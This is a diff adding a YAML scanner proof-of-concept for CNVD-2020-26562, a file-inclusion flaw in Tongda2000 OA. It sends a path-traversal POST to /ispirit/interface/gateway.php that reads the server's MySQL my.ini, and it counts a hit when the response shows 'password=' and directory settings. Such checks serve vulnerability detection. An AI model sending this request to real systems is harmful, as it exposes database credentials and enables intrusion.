@@ -1,0 +1,22 @@
+name: yaml-poc-tongda2000-office_anywhere-file_inclusion-CNVD-2020-26562
+binding: 1c5dba49-bcd0-4224-8784-0153e29b9bc2
+detail:
+    author: system_user
+    links:
+        - https://www.hacking8.com/bug-web/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.html
+    vulnerability:
+        id: c9cdbe7f-634d-4cee-8b84-f57e025741bb
+        level: high
+    warning: Harmless
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /ispirit/interface/gateway.php
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: json={"url":"/general/../../mysql5/my.ini"}
+        expression: response.status == 200 && response.body.bcontains(b"[mysql]") && response.body.bcontains(b"password=") && response.headers["content-type"].contains("text/html") && response.body.bcontains(b"basedir=") && response.body.bcontains(b"datadir=") && response.body.bcontains(b"tmpdir=") && response.body.bcontains(b"innodb_data_home_dir=")
+expression: r0()
